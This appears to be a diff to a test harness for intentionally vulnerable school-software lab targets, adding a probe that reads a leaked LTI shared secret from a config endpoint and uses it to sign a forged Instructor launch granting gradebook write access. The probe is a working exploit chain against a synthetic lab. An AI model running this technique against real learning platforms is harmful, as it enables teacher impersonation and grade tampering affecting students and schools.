@@ -251,6 +251,60 @@ async function probeGuardianInviteTakeover() {
   return ["target: k12-guardian-invite-takeover", "guardian_account_takeover: confirmed"]
 }
 
+async function probeLtiSharedSecretLeak() {
+  const { proc, base } = await startTarget("k12-lti-shared-secret-leak")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-lti-shared-secret-leak") fail(proc, "health probe failed")
+
+  const config = await fetch(`${base}/.well-known/lti-config.json`).then((res) => res.json()) as {
+    consumerKey?: string
+    sharedSecret?: string
+    launchUrl?: string
+    labFinding?: string
+  }
+  if (
+    config.consumerKey !== "district-lms" ||
+    config.sharedSecret !== "lti-secret-demo-9421" ||
+    config.launchUrl !== "/lti/launch" ||
+    config.labFinding !== "lti_shared_secret_disclosure"
+  ) {
+    fail(proc, "LTI config probe did not confirm shared secret disclosure")
+  }
+
+  const crypto = await import("node:crypto")
+  const launch = {
+    consumerKey: config.consumerKey,
+    userId: "synthetic-instructor-9001",
+    role: "Instructor",
+    courseId: "math-8",
+  }
+  const signedLaunch = await fetch(`${base}/lti/launch`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      ...launch,
+      signature: crypto.createHmac("sha256", config.sharedSecret).update(JSON.stringify(launch)).digest("hex"),
+    }),
+  }).then((res) => res.json()) as {
+    launched?: boolean
+    role?: string
+    gradebookWrite?: boolean
+    labFinding?: string
+  }
+  if (
+    !signedLaunch.launched ||
+    signedLaunch.role !== "Instructor" ||
+    !signedLaunch.gradebookWrite ||
+    signedLaunch.labFinding !== "forged_lti_instructor_launch"
+  ) {
+    fail(proc, "LTI launch probe did not confirm forged instructor launch")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-lti-shared-secret-leak", "forged_lti_instructor_launch: confirmed"]
+}
+
 const lines = [
   "ulm_lab_target: ok",
   ...(await probeMfaGap()),
@@ -260,6 +314,7 @@ const lines = [
   ...(await probeStudentSearchInjection()),
   ...(await probePasswordResetTokenLeak()),
   ...(await probeGuardianInviteTakeover()),
+  ...(await probeLtiSharedSecretLeak()),
 ]
 
 console.log(lines.join("\n"))
